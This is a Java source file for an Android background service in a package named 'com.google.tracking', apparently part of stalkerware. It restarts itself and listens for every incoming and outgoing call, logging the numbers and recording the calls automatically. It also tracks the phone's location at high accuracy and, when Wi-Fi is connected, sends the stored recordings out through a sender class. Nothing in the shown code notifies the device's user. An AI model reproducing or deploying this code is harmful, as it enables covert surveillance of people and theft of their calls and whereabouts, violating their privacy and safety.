package com.google.tracking;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import android.util.Log;
import com.google.android.gms.common.api.GoogleApiClient;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationServices;
import com.google.tracking.call.CallRecorderController;
import com.google.tracking.constants.TrackingConstants;
import com.google.tracking.runnable.RepeatingTask;
import com.google.tracking.sender.DataSender;
import com.google.tracking.google_api.ApiConnectionListener;

import java.io.*;


public class TService extends Service {

    private static final String TAG = "TService";
    private static final String ACTION_IN = "android.intent.action.PHONE_STATE";
    private static final String ACTION_OUT = "android.intent.action.NEW_OUTGOING_CALL";
    private CallReceiver callReceiver;
    private RepeatingTask repeatingTask;
    private DataSender dataSender;


    @Override
    public IBinder onBind(Intent arg0) {
        // TODO Auto-generated method stub
        return null;
    }

    @Override
    public void onDestroy() {
        Log.d("service", "destroy");

        super.onDestroy();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // final String terminate =(String)
        // intent.getExtras().get("terminate");//
        // intent.getStringExtra("terminate");
        // Log.d("TAG", "service started");
        //
        // TelephonyManager telephony = (TelephonyManager)
        // getSystemService(Context.TELEPHONY_SERVICE); // TelephonyManager
        // // object
        // CustomPhoneStateListener customPhoneListener = new
        // CustomPhoneStateListener();
        // telephony.listen(customPhoneListener,
        // PhoneStateListener.LISTEN_CALL_STATE);
        // context = getApplicationContext();

        recorderController = new CallRecorderController();

        final IntentFilter filter = new IntentFilter();
        filter.addAction(ACTION_OUT);
        filter.addAction(ACTION_IN);
        this.callReceiver = new CallReceiver();
        this.registerReceiver(this.callReceiver, filter);

        repeatingTask = new RepeatingTask(TrackingConstants.RUN_REPEATING_TASK_INTERVAL, recorderController, this);

        createGoolApiClient();

        dataSender = new DataSender();

        // if(terminate != null) {
        // stopSelf();
        // }
        return START_STICKY;
    }

    public void readFiles() {
        ConnectivityManager connManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);

        if (mWifi==null || !mWifi.isConnected()) {
            // Do whatever
            return;
        }


        Log.d(TAG, "readFiles " + recorderController.currentFileName());

        String path = Environment.getExternalStorageDirectory().toString() + TrackingConstants.FILES_PATH;

        Log.d("Files", "Path: " + path);

        File f = new File(path);
        File file[] = f.listFiles();

        Log.d("Files", "Size: " + file.length);
        for (
                int i = 0;
                i < file.length; i++)

        {
            Log.d("Files", "FileName:" + file[i].getName());
            if(file[i].getName() != recorderController.currentFileName())
            {

                InputStream in = null;
                byte[] buffer;
                try {
                    in = new BufferedInputStream(new FileInputStream(file[i]));
                    buffer = new byte[in.available()];
                    in.read(buffer);

                    dataSender = new DataSender();
                    dataSender.execute(file[i]);
//                    dataSender.sendFile(buffer, file[i].getName());
                }
                catch (Exception e) {
                }
                finally {
                    try {
                        if (in != null) {
                            in.close();
                        }
                    } catch (IOException ex) {
                        ex.printStackTrace();
                    }
                }



                break;
            }
        }
    }

    private GoogleApiClient mGoogleApiClient;
    private ApiConnectionListener mApiConnectionListener;
    private void createGoolApiClient() {
        // Create an instance of GoogleAPIClient.
        mApiConnectionListener = new ApiConnectionListener();
        if (mGoogleApiClient == null) {
            mGoogleApiClient = new GoogleApiClient.Builder(this)
                    .addConnectionCallbacks(mApiConnectionListener)
                    .addOnConnectionFailedListener(mApiConnectionListener)
                    .addApi(LocationServices.API)
                    .build();

            mApiConnectionListener.setClient(mGoogleApiClient);
            mApiConnectionListener.setController(this);
        }

        mGoogleApiClient.connect();
    }

    public void createLocationRequest() {
        Log.d(TAG, "createLocationRequest()");
        LocationRequest mLocationRequest = new LocationRequest();
        mLocationRequest.setInterval(TrackingConstants.RUN_REPEATING_TASK_INTERVAL);
        mLocationRequest.setFastestInterval(5000);
        mLocationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);

        LocationServices.FusedLocationApi.requestLocationUpdates(
                mGoogleApiClient, mLocationRequest, mApiConnectionListener);
    }

    protected void stopLocationUpdates() {
        LocationServices.FusedLocationApi.removeLocationUpdates(
                mGoogleApiClient, mApiConnectionListener);
    }

    CallRecorderController recorderController;

    public class CallReceiver extends BroadcastReceiver {
        private String log_tag = "CallReceiver";
        Bundle bundle;
        String state;
        String inCall, outCall;
        public boolean wasRinging = false;


        public CallReceiver() {

        }

        @Override
        public void onReceive(Context context, Intent intent) {
//            TelephonyManager telephony = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
//            telephony.listen(new PhoneStateListener() {
//                @Override
//                public void onCallStateChanged(int state, String incomingNumber) {
//                    super.onCallStateChanged(state, incomingNumber);
//                    Toast.makeText(getApplicationContext(), "incomingNumber:" + " " + incomingNumber, Toast.LENGTH_LONG).show();
//                }
//            }, PhoneStateListener.LISTEN_CALL_STATE);

//            String phoneNumber = getResultData();
//            if (phoneNumber == null) {
//                // No reformatted number, use the original
//                phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
//            }

            if (intent.getAction().equals(ACTION_IN)) {
                if ((bundle = intent.getExtras()) != null) {

                    state = bundle.getString(TelephonyManager.EXTRA_STATE);

                    if (state.equals(TelephonyManager.EXTRA_STATE_RINGING)) {

                        inCall = bundle.getString(TelephonyManager.EXTRA_INCOMING_NUMBER);
                        wasRinging = true;
//                        Toast.makeText(context, "IN : " + inCall, Toast.LENGTH_LONG).show();
                        Log.d(log_tag, "IN : " + inCall);

                    } else if (state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
                        if (wasRinging == true) {

//                            Toast.makeText(context, "ANSWERED : " + inCall, Toast.LENGTH_LONG).show();
                            Log.d(log_tag, "ANSWERED : " + inCall);
                            recorderController.recordCall(inCall);

                        }
                    } else if (state.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                        wasRinging = false;
//                        Toast.makeText(context, "REJECT || DISCO : " + inCall, Toast.LENGTH_LONG).show();
                        Log.d(log_tag, "REJECT || DISCO : " + inCall);
                        recorderController.stopRecordCall();
                    }
                }
            } else if (intent.getAction().equals(ACTION_OUT)) {
                if ((bundle = intent.getExtras()) != null) {
                    outCall = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
//                    Toast.makeText(context, "OUT : " + outCall, Toast.LENGTH_LONG).show();
                    Log.d(log_tag, "OUT : " + outCall);
                    recorderController.recordCall(outCall);
                }
            }
        }

    }
}